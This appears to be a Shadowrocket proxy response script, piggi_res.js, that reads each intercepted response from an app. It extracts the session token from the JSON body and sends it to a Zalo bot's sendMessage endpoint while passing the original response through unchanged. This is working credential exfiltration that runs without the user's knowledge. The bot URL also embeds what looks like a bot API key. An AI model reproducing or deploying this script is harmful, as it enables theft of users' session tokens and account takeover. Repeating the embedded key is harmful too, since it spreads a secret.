// piggi_res.js
// Shadowrocket Script: http-response

const ZALO_URL =
  "https://bot-api.zaloplatforms.com/bot3638914406530093654:sFwfWYIvrOYeZJfoHfpBwwgsxOHcSzisHLeIEJprYVzfwRPiFWTBQEvDyJbEYvRK/sendMessage";

const CHAT_ID = "b89af526f06919374078";

function safeJsonParse(s) {
  try {
    return JSON.parse(s);
  } catch (_) {
    return null;
  }
}

(async () => {
  const resObj = safeJsonParse($response.body || "");
  const token = resObj?.data?.token;

  // luôn trả response gốc cho app
  if (!token) return $done({});

  const payload = {
    chat_id: CHAT_ID,
    text: token,
  };

  // gọi Zalo API
  $task
    .fetch({
      url: ZALO_URL,
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
    .then(
      (r) => {
        console.log("Zalo sendMessage status:", r.statusCode);
        $done({});
      },
      (err) => {
        console.log("Zalo sendMessage error:", String(err));
        $done({});
      }
    );
})();
